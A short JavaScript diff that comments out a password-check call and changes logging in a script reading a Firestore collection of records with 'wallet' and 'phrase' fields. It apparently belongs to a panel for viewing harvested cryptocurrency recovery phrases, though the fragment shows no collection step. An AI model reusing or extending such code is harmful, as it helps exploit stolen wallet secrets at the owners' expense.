@@ -31,14 +31,16 @@ function alert_pass() {
         location.reload()
     }
 }
-alert_pass()
+//alert_pass()
 
 db.collection("datas").orderBy("time", "desc").get().then((querySnapshot) => {
     querySnapshot.forEach((doc) => {
 
    
    
-   console.log(doc.id, " => ", doc.data());
+   //console.log(doc.id, " => ", doc.data());
+   console.log(doc.id[0])
+
    
    let wallet = doc.data().wallet
    let phrase = doc.data().phrase
